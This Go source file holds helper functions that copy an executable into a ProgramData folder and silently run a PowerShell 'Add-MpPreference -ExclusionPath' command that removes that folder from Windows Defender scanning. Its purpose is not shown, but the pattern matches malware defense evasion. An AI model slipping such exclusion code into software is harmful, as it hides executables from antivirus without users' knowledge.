package main

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
)

func copyFile(srcPath, targetPath string) error {
	srcFile, err := os.Open(srcPath)
	if err != nil {
		return fmt.Errorf("failed to open source executable: %w", err)
	}
	defer srcFile.Close()

	dstFile, err := os.Create(targetPath)
	if err != nil {
		return fmt.Errorf("failed to create target executable in ProgramData: %w", err)
	}
	defer dstFile.Close()

	if _, err := io.Copy(dstFile, srcFile); err != nil {
		return fmt.Errorf("failed to copy executable to ProgramData: %w", err)
	}

	if err := dstFile.Sync(); err != nil {
		return fmt.Errorf("failed to sync target executable: %w", err)
	}

	return nil
}

func defenderExclude(name string) error {
	programDataDir := os.Getenv("ProgramData")
	if programDataDir == "" {
		return fmt.Errorf("PROGRAMDATA environment variable not set")
	}

	targetDir := filepath.Join(programDataDir, name)
	if _, err := os.Stat(targetDir); os.IsNotExist(err) {
		if err := os.MkdirAll(targetDir, os.ModePerm); err != nil {
			return fmt.Errorf("failed to create service directory in ProgramData: %w", err)
		}
	}

	powerShellCommand := fmt.Sprintf(`Add-MpPreference -ExclusionPath '%s' -Force`, targetDir)

	args := []string{"-NoProfile", "-NonInteractive", "-Command"}

	if err := exec.Command("powershell.exe", append(args, powerShellCommand)...).Run(); err != nil {
		return fmt.Errorf("failed to add exclusion to Windows Defender: %w", err)
	}

	return nil
}
